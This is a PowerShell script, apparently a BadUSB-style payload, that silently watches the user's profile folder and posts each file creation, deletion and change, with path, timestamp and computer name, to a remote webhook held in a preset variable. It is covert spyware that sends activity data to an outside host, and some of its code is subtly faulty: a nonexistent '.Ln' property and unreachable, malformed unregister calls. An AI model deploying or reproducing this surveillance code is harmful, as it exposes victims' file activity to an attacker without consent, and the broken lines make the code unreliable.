$whuri = "$dc"
 # shortened URL Detection
if ($whuri.Ln -ne 121){Write-Host "Shortened Webhook URL Detected.." ; $whuri = (irm $whuri).url}

$watcher = New-Object System.IO.FileSystemWatcher -Property @{
    Path = $env:USERPROFILE + '\'
}
$watcher.NotifyFilter = [System.IO.NotifyFilters]::FileName -bor `
                        [System.IO.NotifyFilters]::LastWrite -bor `
                        [System.IO.NotifyFilters]::DirectoryName

$action = {
    $event = $EventArgs
    $path = $event.FullPath
    $changeType = $event.ChangeType
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    
    $msgsys = "[$timestamp] File $changeType > $path"
    $escmsgsys = $msgsys -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
    $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = $escmsgsys} | ConvertTo-Json
    Invoke-RestMethod -Uri $whuri -Method Post -ContentType "application/json" -Body $jsonsys

}

Register-ObjectEvent -InputObject $watcher -EventName Created -Action $action
Register-ObjectEvent -InputObject $watcher -EventName Deleted -Action $action
Register-ObjectEvent -InputObject $watcher -EventName Changed -Action $action

$watcher.EnableRaisingEvents = $true

while ($true) {
    Start-Sleep -Milliseconds 500
}

Unregister-Event -InputObject $watcher -EventName Created -Action $action
Unregister-Event -InputObject $watcher -EventName Deleted -Action $action
Unregister-Event -InputObject $watcher -EventName Changed -Action $action
